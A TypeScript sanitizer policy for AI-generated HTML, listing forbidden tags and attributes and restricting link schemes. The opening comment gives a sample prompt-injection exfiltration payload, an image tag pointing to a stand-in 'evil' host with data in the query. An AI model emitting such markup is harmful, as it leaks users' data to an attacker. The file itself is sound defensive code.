// Sanitizer policy for AI-generated HTML (Cody answers, summaries, generated
// journal notes). A prompt-injected answer must not be able to make the browser
// fetch an attacker URL on its own (`<img src="https://evil/x?d=...">`), so
// everything that can load a remote resource is removed. Links stay, but are
// forced to open safely and only for http, https and mailto.
//
// Pure data and functions, no DOM: plugins/sanitize-html.client.ts feeds this
// to DOMPurify, and tests/unit/aiHtmlPolicy.test.mjs checks it under node.

export const AI_FORBID_TAGS: string[] = [
    'img', 'picture', 'source', 'video', 'audio', 'track', 'iframe', 'frame',
    'frameset', 'object', 'embed', 'svg', 'math', 'style', 'link', 'script',
    'base', 'meta', 'form', 'input', 'button', 'image',
]

export const AI_FORBID_ATTR: string[] = [
    'style', 'src', 'srcset', 'background', 'poster', 'xlink:href', 'data',
    'srcdoc', 'action', 'formaction', 'ping', 'dynsrc', 'lowsrc',
]

export const AI_ALLOWED_URI_REGEXP = /^(?:https?|mailto):/i

export const AI_LINK_REL = 'noopener noreferrer nofollow'

export const AI_SANITIZE_CONFIG = {
    USE_PROFILES: { html: true },
    FORBID_TAGS: AI_FORBID_TAGS,
    FORBID_ATTR: AI_FORBID_ATTR,
    ALLOWED_URI_REGEXP: AI_ALLOWED_URI_REGEXP,
    ALLOW_DATA_ATTR: false,
    ADD_ATTR: ['target'],
}

export function isAiTagAllowed(tag: string): boolean {
    return !AI_FORBID_TAGS.includes(String(tag).toLowerCase())
}

export function isAiAttrAllowed(attr: string): boolean {
    const name = String(attr).toLowerCase()
    if (AI_FORBID_ATTR.includes(name)) return false
    if (name.startsWith('on')) return false
    return true
}

export function isAiUriAllowed(uri: string): boolean {
    // Browsers ignore tabs/newlines/control chars inside a scheme.
    // eslint-disable-next-line no-control-regex
    return AI_ALLOWED_URI_REGEXP.test(String(uri).replace(/[\u0000- ]/g, ''))
}

/** Applied to every <a> that survives sanitizing. */
export function hardenAiLink(el: { setAttribute: (k: string, v: string) => void }) {
    el.setAttribute('target', '_blank')
    el.setAttribute('rel', AI_LINK_REL)
}
